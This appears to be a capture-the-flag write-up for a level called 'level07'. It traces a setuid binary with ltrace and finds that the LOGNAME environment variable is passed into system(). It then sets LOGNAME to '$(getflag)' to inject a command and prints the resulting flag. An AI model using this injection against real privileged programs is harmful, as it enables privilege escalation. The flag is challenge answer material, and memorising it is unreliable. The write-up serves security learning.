### Level07

When I execute `./level07`, the program just prints level07. Adding arguments does not change its behaviour.

Let's start by analyzing level07 with `ltrace` :
```
__libc_start_main(0x8048514, 1, 0xbffff7a4, 0x80485b0, 0x8048620 <unfinished ...>
getegid() = 2007
geteuid() = 2007
setresgid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280) = 0
setresuid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280) = 0
getenv("LOGNAME") = "level07
asprintf(0xbffff6f4, 0x8048688, 0xbfffff31, 0xb7e5ee55, 0xb7fed280) = 18
system("/bin/echo level07 "level07
 <unfinished ...>
--- SIGCHLD (Child exited) ---
<... system resumed> ) = 0
+++ exited (status 0) +++
```

We see a call to getenv to get LOGNAME and a call to echo to print the value of the variable. Just change the value with export: 
`export LOGNAME='$(getflag)' `

Then just run ./level07 to display the flag
`fiumuikeil55xe9cu4dood66h`
